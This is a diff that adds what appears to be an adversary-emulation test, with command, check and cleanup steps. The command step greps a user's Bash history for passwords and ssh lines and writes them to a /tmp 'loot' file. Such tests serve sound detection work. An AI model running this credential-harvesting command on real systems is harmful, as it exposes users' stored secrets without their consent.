@@ -1,0 +1,8 @@
+;
+#command
+echo "passwd in Bash History:" > /tmp/loot.txt
+cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' >> /tmp/loot.txt
+#check
+cat /tmp/loot.txt
+#cleanup
+rm -f /tmp/loot.txt
